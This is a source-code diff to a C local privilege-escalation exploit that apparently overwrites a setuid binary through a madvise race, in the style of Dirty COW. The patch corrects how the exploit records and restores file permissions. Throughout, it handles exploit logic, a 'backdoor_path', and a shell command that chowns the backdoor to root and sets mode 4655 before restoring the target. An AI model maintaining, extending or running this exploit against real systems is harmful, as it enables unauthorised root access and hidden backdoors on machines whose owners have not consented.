@@ -10,6 +10,9 @@
 #include "a.out.h"
 
 #define BACKUP_PATH	"./.back"
+#ifndef ALLPERMS
+# define ALLPERMS (S_ISUID|S_ISGID|S_ISVTX|S_IRWXU|S_IRWXG|S_IRWXO)
+#endif
 
 void *thread_madvise(void *map)
 {
@@ -71,49 +74,6 @@ int backup_target(const char *path)
 	return 0;
 }
 
-int mode_to_permissions(int mode)
-{
-	int perm = 0;
-
-	if (mode & S_ISUID) {
-		perm += 4000;
-	}
-	if (mode & S_ISGID) {
-		perm += 2000;
-	}
-	if (mode & S_ISVTX) {
-		perm += 1000;
-	}
-	if (mode & S_IRUSR) {
-		perm += 400;
-	}
-	if (mode & S_IWUSR) {
-		perm += 200;
-	}
-	if (mode & S_IXUSR) {
-		perm += 100;
-	}
-	if (mode & S_IRGRP) {
-		perm += 40;
-	}
-	if (mode & S_IWGRP) {
-		perm += 20;
-	}
-	if (mode & S_IXGRP) {
-		perm += 10;
-	}
-	if (mode & S_IROTH) {
-		perm += 4;
-	}
-	if (mode & S_IWOTH) {
-		perm += 2;
-	}
-	if (mode & S_IXOTH) {
-		perm += 1;
-	}
-	return perm;
-}
-
 int verify_exploit(const char *path)
 {
 	int target;
@@ -155,7 +115,7 @@ int main(int argc, char **argv)
 		return -1;
 	}
 	fstat(target, &st);
-	target_perm = mode_to_permissions(st.st_mode);
+	target_perm = st.st_mode;
 	size = st.st_size;
 	if (size < __a_out_len) {
 		printf("Target size is too small.\n");
@@ -187,14 +147,14 @@ int main(int argc, char **argv)
 	}
 	snprintf(commands,
 		 sizeof(commands),
-		 "echo \"rm -f %s && chown root:root %s && chmod 4655 %s && mv %s %s && chown root:root %s && chmod %d %s\" | %s",
+		 "echo \"rm -f %s && chown root:root %s && chmod 4655 %s && mv %s %s && chown root:root %s && chmod %o %s\" | %s",
 		 target_path,
 		 backdoor_path,
 		 backdoor_path,
 		 BACKUP_PATH,
 		 target_path,
 		 target_path,
-		 target_perm,
+		 ALLPERMS & target_perm,
 		 target_path,
 		 target_path
 	);
